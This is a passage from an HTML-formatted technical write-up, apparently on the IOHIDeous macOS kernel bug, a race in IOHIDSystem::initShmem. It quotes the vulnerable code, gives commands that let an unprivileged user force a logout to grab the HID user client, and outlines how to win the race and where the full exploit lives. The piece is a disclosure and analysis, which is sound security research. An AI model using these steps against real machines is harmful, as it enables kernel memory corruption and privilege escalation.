    &lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;evShmemOffset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;      &lt;span class=&quot;cm&quot;&gt;/* Offset to private shmem regions */&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;EvOffsets&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;/li&gt;
&lt;li&gt;The &lt;code class=&quot;highlighter-rouge&quot;&gt;EvGlobals&lt;/code&gt; structure.&lt;br/&gt;This is where the event queue and cursor data reside, and this makes up 99% of the shared memory. I’ll omit the lengthy declaration here, you can view it in &lt;a href=&quot;https://opensource.apple.com/source/IOHIDFamily/IOHIDFamily-1035.1.4/IOHIDSystem/IOKit/hidsystem/IOHIDShared.h.auto.html&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;IOHIDShared.h&lt;/code&gt;&lt;/a&gt; or see my annotated version in &lt;a href=&quot;https://github.com/Siguza/IOHIDeous/tree/master/data/evg.c&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;data/evg.c&lt;/code&gt;&lt;/a&gt;.&lt;/li&gt;
&lt;li&gt;Private driver memory.&lt;br/&gt;As far as I can see, this remains unused and has a size of 0 bytes.&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;In &lt;code class=&quot;highlighter-rouge&quot;&gt;IOHIDSystem&lt;/code&gt;, the extensively used &lt;code class=&quot;highlighter-rouge&quot;&gt;EvGlobals&lt;/code&gt; address is assigned to an &lt;code class=&quot;highlighter-rouge&quot;&gt;evg&lt;/code&gt; class variable, and (even though unused) the address of the private driver memory is similarly assigned to &lt;code class=&quot;highlighter-rouge&quot;&gt;evs&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;To initialise that memory, &lt;code class=&quot;highlighter-rouge&quot;&gt;IOHIDSystem&lt;/code&gt; offers a &lt;code class=&quot;highlighter-rouge&quot;&gt;createShmem&lt;/code&gt; function which &lt;code class=&quot;highlighter-rouge&quot;&gt;IOHIDUserClient&lt;/code&gt; implements as external method &lt;code class=&quot;highlighter-rouge&quot;&gt;0&lt;/code&gt;. Like pretty much any IOHIDFamily interface these days, &lt;code class=&quot;highlighter-rouge&quot;&gt;IOHIDSystem::createShmem&lt;/code&gt; is neatly gated to prevent any concurrent access, and the real implementation resides in &lt;code class=&quot;highlighter-rouge&quot;&gt;IOHIDSystem::createShmemGated&lt;/code&gt;. On Sierra and earlier that function actually allocated the shared memory if necessary, but since High Sierra (or IOHIDFamily version 1035.1.4) that duty has been shifted to &lt;code class=&quot;highlighter-rouge&quot;&gt;IOHIDSystem::init&lt;/code&gt;. Regardless, all code paths eventually end up at &lt;code class=&quot;highlighter-rouge&quot;&gt;IOHIDSystem::initShmem&lt;/code&gt;, which is responsible for cleaning and initialising the actual data structures.&lt;/p&gt;
&lt;p&gt;And that’s where it gets interesting.&lt;/p&gt;
&lt;h2 id=&quot;the-vulnerability&quot;&gt;The vulnerability&lt;/h2&gt;
&lt;p&gt;This is the beginning of &lt;code class=&quot;highlighter-rouge&quot;&gt;IOHIDSystem::initShmem&lt;/code&gt;, containing the vulnerability:&lt;/p&gt;
&lt;div class=&quot;language-c++ highlighter-rouge&quot; readability=&quot;8&quot;&gt;
&lt;div class=&quot;highlight&quot; readability=&quot;11&quot;&gt;
&lt;pre class=&quot;highlight&quot;&gt;
&lt;code&gt;&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt;  &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;EvOffsets&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;eop&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;oldFlags&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;cm&quot;&gt;/* top of sharedMem is EvOffsets structure */&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;eop&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;EvOffsets&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;shmem_addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;if&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;!&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;clean&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;oldFlags&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;EvGlobals&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)((&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;shmem_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;EvOffsets&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)))&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;eventFlags&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;bzero&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;shmem_addr&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;shmem_size&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

&lt;span class=&quot;cm&quot;&gt;/* fill in EvOffsets structure */&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;eop&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;evGlobalsOffset&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;EvOffsets&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;eop&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;evShmemOffset&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;eop&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;evGlobalsOffset&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;EvGlobals&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;

&lt;span class=&quot;cm&quot;&gt;/* find pointers to start of globals and private shmem region */&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;evg&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;EvGlobals&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)((&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;shmem_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;eop&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;evGlobalsOffset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;span class=&quot;n&quot;&gt;evs&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)((&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;shmem_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;eop&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;evShmemOffset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;Can you spot it? What if I told you that this function can be called when the shared memory is already mapped in the calling task, and that &lt;code class=&quot;highlighter-rouge&quot;&gt;EvOffsets&lt;/code&gt; is declared as &lt;code class=&quot;highlighter-rouge&quot;&gt;volatile&lt;/code&gt;? :P&lt;/p&gt;
&lt;p&gt;The thing is that between this line:&lt;/p&gt;
&lt;div class=&quot;language-c++ highlighter-rouge&quot; readability=&quot;6&quot;&gt;
&lt;div class=&quot;highlight&quot; readability=&quot;7&quot;&gt;
&lt;pre class=&quot;highlight&quot;&gt;
&lt;code&gt;&lt;span class=&quot;n&quot;&gt;eop&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;evGlobalsOffset&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;EvOffsets&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;and this one:&lt;/p&gt;
&lt;div class=&quot;language-c++ highlighter-rouge&quot; readability=&quot;6&quot;&gt;
&lt;div class=&quot;highlight&quot; readability=&quot;7&quot;&gt;
&lt;pre class=&quot;highlight&quot;&gt;
&lt;code&gt;&lt;span class=&quot;n&quot;&gt;evg&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;EvGlobals&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)((&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;char&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;shmem_addr&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;eop&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;evGlobalsOffset&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;);&lt;/span&gt;
&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;The value of &lt;code class=&quot;highlighter-rouge&quot;&gt;eop-&amp;gt;evGlobalsOffset&lt;/code&gt; can change, which will then cause &lt;code class=&quot;highlighter-rouge&quot;&gt;evg&lt;/code&gt; to point to somewhere other than intended.&lt;/p&gt;
&lt;p&gt;From looking &lt;a href=&quot;https://opensource.apple.com/source/IOHIDFamily/IOHIDFamily-33/IOHIDSystem/IOHIDSystem.cpp.auto.html&quot;&gt;at the source&lt;/a&gt;, this vulnerability seems to have been present at least since as far back as 2002. There also used to be a copyright notice from NeXT Computer, Inc. noting an &lt;code class=&quot;highlighter-rouge&quot;&gt;EventDriver.m&lt;/code&gt; - such a file is nowhere to be found on the web, but if the vulnerable code came from there and if the dates in the copyright notice are to be trusted, that would put the origin of the bug even 10 years further back (older than myself!), but I don’t know that so I’m just gonna assume it came to life in 2002.&lt;/p&gt;
&lt;h2 id=&quot;putting-the-exploit-together&quot;&gt;Putting the exploit together&lt;/h2&gt;
&lt;p&gt;The fun part. :P&lt;/p&gt;
&lt;h3 id=&quot;getting-access&quot;&gt;Getting access&lt;/h3&gt;
&lt;p&gt;Before we can do anything else, we have to look at how we can actually get access to thing we wanna play with, i.e. how we can spawn an &lt;code class=&quot;highlighter-rouge&quot;&gt;IOHIDUserClient&lt;/code&gt; when &lt;code class=&quot;highlighter-rouge&quot;&gt;WindowServer&lt;/code&gt; is holding the only available one.&lt;/p&gt;
&lt;p&gt;The first option I implemented was to just get &lt;code class=&quot;highlighter-rouge&quot;&gt;WindowServer&lt;/code&gt;’s task port and “steal” its client with &lt;code class=&quot;highlighter-rouge&quot;&gt;mach_port_extract_right&lt;/code&gt;. Works like a charm, the only problem is that this requires both you to be root and SIP to be disabled.&lt;/p&gt;
&lt;p&gt;The next lower option is to simply &lt;code class=&quot;highlighter-rouge&quot;&gt;kill -9 WindowServer&lt;/code&gt;. Still requires root, but at least that works with SIP enabled. &lt;code class=&quot;highlighter-rouge&quot;&gt;WindowServer&lt;/code&gt; goes down, its UserClient gets cleaned up and we have plenty of time to spawn our own. As a side effect, you’ll also notice the system’s entire graphical interface going down along with &lt;code class=&quot;highlighter-rouge&quot;&gt;WindowServer&lt;/code&gt; - so we’re not exactly stealthy at this point.&lt;/p&gt;
&lt;p&gt;I did some more digging and found that &lt;code class=&quot;highlighter-rouge&quot;&gt;WindowServer&lt;/code&gt; actually lets go of its UserClient for a few seconds when a user logs out - more than enough time for us to grab it. So finally we have something that doesn’t require us to run as root, but merely as the currently logged-in user, since we can easily force a logout with:&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot;&gt;
&lt;div class=&quot;highlight&quot;&gt;
&lt;pre class=&quot;highlight&quot;&gt;
&lt;code&gt;launchctl reboot logout
&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;But can we go lower? Can we do this as any unprivileged user? TL;DR: Yes we can!&lt;br/&gt;First, we can try with some AppleScript trickery. &lt;code class=&quot;highlighter-rouge&quot;&gt;loginwindow&lt;/code&gt; implements something called “AppleEventReallyLogOut” or “aevtrlgo” for short, which attempts to log the user out without a confirmation dialogue. For reasons of apparent insanity, &lt;code class=&quot;highlighter-rouge&quot;&gt;loginwindow&lt;/code&gt; does not seem to verify where this event is coming from, so any unprivileged account such as, say, &lt;code class=&quot;highlighter-rouge&quot;&gt;nobody&lt;/code&gt;, can get away with this:&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot; readability=&quot;6&quot;&gt;
&lt;div class=&quot;highlight&quot; readability=&quot;7&quot;&gt;
&lt;pre class=&quot;highlight&quot;&gt;
&lt;code&gt;osascript -e 'tell application &quot;loginwindow&quot; to «event aevtrlgo»'
&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;Now, it doesn’t work quite as flawlessly as the previous method. It acts as if the user had actually chosen to log out via the GUI - which means that apps with unsaved changes can still abort the logout, or at least prompt for confirmation (an example for this is Terminal with a running command). In contrast, &lt;code class=&quot;highlighter-rouge&quot;&gt;launchctl&lt;/code&gt; just tears down your GUI session without letting anyone say a damn thing. (Another drawback is that we cannot test the success of &lt;code class=&quot;highlighter-rouge&quot;&gt;aevtrlgo&lt;/code&gt;, since the call returns while the confirmation popup is still active. This seems like a limitation of AppleScript.)&lt;/p&gt;
&lt;p&gt;But second, alternatively to a logout, a shutdown or reboot will do as well. This makes for an interesting possibility: we could write a sleeper program and just &lt;em&gt;wait&lt;/em&gt; for conditions to become favourable - I have no access to any statistics, but I’d assume most Macs are &lt;em&gt;eventually&lt;/em&gt; shut down or rebooted manually, rather than only ever going down as the result of a panic. And if that assumption holds, then our sleeper will get the chance to run and snatch the UserClient it needs.&lt;/p&gt;
&lt;p&gt;So in order to maximise our success rate, we do the following:&lt;/p&gt;
&lt;ol&gt;&lt;li&gt;Install signal handlers for &lt;code class=&quot;highlighter-rouge&quot;&gt;SIGTERM&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;SIGHUP&lt;/code&gt;. This should buy us at least a few seconds after a logout/shutdown/reboot has been initiated.&lt;/li&gt;
&lt;li&gt;Run &lt;code class=&quot;highlighter-rouge&quot;&gt;launchctl reboot logout&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;If the former failed, run &lt;code class=&quot;highlighter-rouge&quot;&gt;osascript -e 'tell application &quot;loginwindow&quot; to «event aevtrlgo»'&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;Try spawning the desired UserClient repeatedly. Whether we succeeded in logging the user out doesn’t matter at this point, we’ll just wait for a manual logout/shutdown/reboot if not. So as long as the return value of &lt;code class=&quot;highlighter-rouge&quot;&gt;IOServiceOpen&lt;/code&gt; is &lt;code class=&quot;highlighter-rouge&quot;&gt;kIOReturnBusy&lt;/code&gt;, we keep looping.&lt;/li&gt;
&lt;/ol&gt;&lt;p&gt;&lt;em&gt;This is implemented in &lt;a href=&quot;https://github.com/Siguza/IOHIDeous/tree/master/src/hid/obtain.c&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;src/hid/obtain.c&lt;/code&gt;&lt;/a&gt; with some parts residing in &lt;a href=&quot;https://github.com/Siguza/IOHIDeous/tree/master/src/hid/main.c&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;src/hid/main.c&lt;/code&gt;&lt;/a&gt;.&lt;/em&gt;&lt;/p&gt;
&lt;h3 id=&quot;triggering-the-bug&quot;&gt;Triggering the bug&lt;/h3&gt;
&lt;p&gt;With access secured, we can get to triggering our bug. It’s obvious that we &lt;em&gt;can&lt;/em&gt; be lucky enough to modify &lt;code class=&quot;highlighter-rouge&quot;&gt;eop-&amp;gt;evGlobalsOffset&lt;/code&gt; just in the right moment - but how likely is that, and what can go wrong? There are three possible outcomes:&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;We lose the race, i.e. &lt;code class=&quot;highlighter-rouge&quot;&gt;evg&lt;/code&gt; is set to what IOHIDFamily intends it to be.&lt;/li&gt;
&lt;li&gt;We win the race, manage to offset &lt;code class=&quot;highlighter-rouge&quot;&gt;evg&lt;/code&gt;, and &lt;code class=&quot;highlighter-rouge&quot;&gt;evg&lt;/code&gt; now points to a data structure we placed on the heap.&lt;/li&gt;
&lt;li&gt;We win the race, but &lt;code class=&quot;highlighter-rouge&quot;&gt;evg&lt;/code&gt; lands in something other than we intended.&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;The last case will probably cause a panic sooner (unmapped memory) or later (corruption of some data structure). Luckily I’ve had this happen only very rarely. Because of that, and because we cannot repair any such corruption anyway, we’re just gonna focus on the other two cases. The first one is undesirable but unproblematic (we can just try again), and the second one is the one we want. Thanks to the initialisation performed by &lt;code class=&quot;highlighter-rouge&quot;&gt;IOHIDSystem&lt;/code&gt;, we can even detect which of those happened: first the entire shared memory (using the correct address) is &lt;code class=&quot;highlighter-rouge&quot;&gt;bzero&lt;/code&gt;‘ed, and afterwards many fields are set (with the offset address), some of which hold a constant value &lt;code class=&quot;highlighter-rouge&quot;&gt;!= 0&lt;/code&gt;. After calling the initialisation routine, we can query any such field and if it holds &lt;code class=&quot;highlighter-rouge&quot;&gt;0&lt;/code&gt;, &lt;code class=&quot;highlighter-rouge&quot;&gt;evg&lt;/code&gt; was offset, otherwise it was not. I chose the &lt;code class=&quot;highlighter-rouge&quot;&gt;version&lt;/code&gt; field in my implementation.&lt;/p&gt;
&lt;p&gt;In conclusion:&lt;/p&gt;
&lt;ul&gt;&lt;li&gt;In one thread, we just spam a value to &lt;code class=&quot;highlighter-rouge&quot;&gt;eop-&amp;gt;evGlobalsOffset&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;In another thread, we call the initialisation routine until &lt;code class=&quot;highlighter-rouge&quot;&gt;evg-&amp;gt;version == 0&lt;/code&gt;.&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;&lt;em&gt;This is implemented in &lt;a href=&quot;https://github.com/Siguza/IOHIDeous/tree/master/src/hid/exploit.c&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;src/hid/exploit.c&lt;/code&gt;&lt;/a&gt;. A minimal standalone implementation also exists in &lt;a href=&quot;https://github.com/Siguza/IOHIDeous/tree/master/src/poc/main.c&quot;&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;src/poc/main.c&lt;/code&gt;&lt;/a&gt;.&lt;/em&gt;&lt;/p&gt;
&lt;h3 id=&quot;shmem-basics&quot;&gt;Shmem basics&lt;/h3&gt;
&lt;p&gt;Now that we can trigger our memory corruption, what exactly can we do with it? First we’ll look at how big of a corruption we can actually cause. &lt;code class=&quot;highlighter-rouge&quot;&gt;eop-&amp;gt;evGlobalsOffset&lt;/code&gt; is of type (signed) &lt;code class=&quot;highlighter-rouge&quot;&gt;int&lt;/code&gt;, so we can offset &lt;code class=&quot;highlighter-rouge&quot;&gt;evg&lt;/code&gt; by &lt;code class=&quot;highlighter-rouge&quot;&gt;INT_MAX&lt;/code&gt; bytes in either direction. That’s quite a lot.&lt;/p&gt;
&lt;p&gt;Next we’ll look at the structure’s size. Since it’s exported to userland, we can just include an IOKit header and do some &lt;code class=&quot;highlighter-rouge&quot;&gt;sizeof&lt;/code&gt;:&lt;/p&gt;
&lt;div class=&quot;language-c highlighter-rouge&quot; readability=&quot;7&quot;&gt;
&lt;div class=&quot;highlight&quot; readability=&quot;9&quot;&gt;
&lt;pre class=&quot;highlight&quot;&gt;
&lt;code&gt;&lt;span class=&quot;c1&quot;&gt;// gcc -o t t.c -Wall -framework IOKit
&lt;/span&gt;&lt;span class=&quot;cp&quot;&gt;#include &amp;lt;stdio.h&amp;gt;
#include &amp;lt;IOKit/hidsystem/IOHIDShared.h&amp;gt;
&lt;/span&gt;
&lt;span class=&quot;kt&quot;&gt;int&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;kt&quot;&gt;void&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;printf&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;0x%lx&lt;/span&gt;&lt;span class=&quot;se&quot;&gt;\n&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;EvOffsets&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;+&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;sizeof&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;EvGlobals&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;));&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;From Sierra 10.12.0 all through High Sierra 10.13.1, that yields &lt;code class=&quot;highlighter-rouge&quot;&gt;0x5ae8&lt;/code&gt;. That’s also quite a lot… in other words, we can slap one monster of a memory structure an entire two gigabytes back and forth through memory (that’s what inspired the name “IOHIDeous”).&lt;/p&gt;
&lt;p&gt;Now, a priori we know neither where this structure resides, nor where any other kernel memory lies in respect to it. So far we only know that it is allocated via an &lt;code class=&quot;highlighter-rouge&quot;&gt;IOBufferMemoryDescriptor&lt;/code&gt;, which for &lt;code class=&quot;highlighter-rouge&quot;&gt;kIOMemoryKernelUserShared&lt;/code&gt; goes through &lt;code class=&quot;highlighter-rouge&quot;&gt;iopa_alloc&lt;/code&gt;, and subsequently maps the memory into the provided task, if any - in this case the &lt;code class=&quot;highlighter-rouge&quot;&gt;kernel_task&lt;/code&gt;, so the mapping ends up on the &lt;code class=&quot;highlighter-rouge&quot;&gt;kernel_map&lt;/code&gt;. Knowing its sharing type and (rounded) size, we can easily find it with &lt;code class=&quot;highlighter-rouge&quot;&gt;kmap&lt;/code&gt;:&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot; readability=&quot;7.5&quot;&gt;
&lt;div class=&quot;highlight&quot; readability=&quot;10&quot;&gt;
&lt;pre class=&quot;highlight&quot;&gt;
&lt;code&gt;bash$ sudo kmap -e | fgrep 24K | fgrep 'mem tru'
ffffff8209855000-ffffff820985b000     [  24K] -rw-/-rwx [mem tru cp] 0000000000000000 [0 0 0 0 0] 00000031/823e0c11:&amp;lt;         4&amp;gt; 0,0 {         6,         6} (dynamic)
&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;Running this a couple of times on Sierra yields addresses like:&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot; readability=&quot;7&quot;&gt;
&lt;div class=&quot;highlight&quot; readability=&quot;9&quot;&gt;
&lt;pre class=&quot;highlight&quot;&gt;
&lt;code&gt;ffffff91ec867000
ffffff91f3ec2000
ffffff91f48f3000
ffffff91f6a2c000
ffffff91f828a000
ffffff91fc02a000
ffffff91fe160000
ffffff91fe6b3000
ffffff91ffc8a000
ffffff9209150000
ffffff92103a8000
ffffff9211be0000
ffffff9213141000
ffffff9215c04000
ffffff921a2ce000
ffffff921bf03000
&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;And on High Sierra:&lt;/p&gt;
&lt;div class=&quot;highlighter-rouge&quot; readability=&quot;6.5&quot;&gt;
&lt;div class=&quot;highlight&quot; readability=&quot;8&quot;&gt;
&lt;pre class=&quot;highlight&quot;&gt;
&lt;code&gt;ffffff8116089000
ffffff8119735000
ffffff812a681000
ffffff81ec925000
ffffff81efedd000
ffffff82005cd000
ffffff820383d000
ffffff8205531000
ffffff82096c0000
&lt;/code&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;/div&gt;
&lt;p&gt;This doesn’t give us much, since these just look like arbitrary locations on the heap. In order to do further statistics, we need to know what we’re looking for. It seems extremely unlikely that there would be some structure at a fixed offset from our shared memory, so our best bet is most likely to make a lot of allocations so as to &lt;em&gt;place&lt;/em&gt; a certain structure at a fixed offset.&lt;/p&gt;
